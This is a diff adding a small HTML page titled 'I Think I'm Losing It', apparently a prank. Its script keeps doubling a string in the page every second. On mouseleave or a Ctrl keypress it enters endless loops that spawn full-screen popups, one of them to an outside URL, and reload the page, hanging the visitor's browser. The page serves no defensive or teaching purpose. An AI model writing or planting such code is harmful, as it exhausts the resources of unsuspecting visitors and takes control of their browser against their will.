@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>I Think I'm Losing It</title>
+</head>
+<body onmouseleave="infinity()">
+    <div id="spam" style="overflow-wrap: break-word;">
+    </div>
+    <script>
+        let x = `/`;
+        setInterval(function spam() {
+           x += x;
+           document.getElementById('spam').innerHTML = x;
+        }, 1000)
+        const y = document.getElementById('spam');
+        if(y.style.width = "100vw") {
+            const z = document.createElement('br');
+        }
+    function infinity() { while(true) { open("https://inowanabehere.github.io/IHaveYourMom/", "", "a").window.resizeTo(window.screen.availWidth, window.screen.availHeight); location.reload() }
+    }
+    document.onkeydown = function(e) {
+        if(e.keyCode === 17) {
+            while(true) { open("", "", "a").window.resizeTo(window.screen.availWidth, window.screen.availHeight); location.reload()}
+        }
+    }
+    </script>
+</body>
+</html>
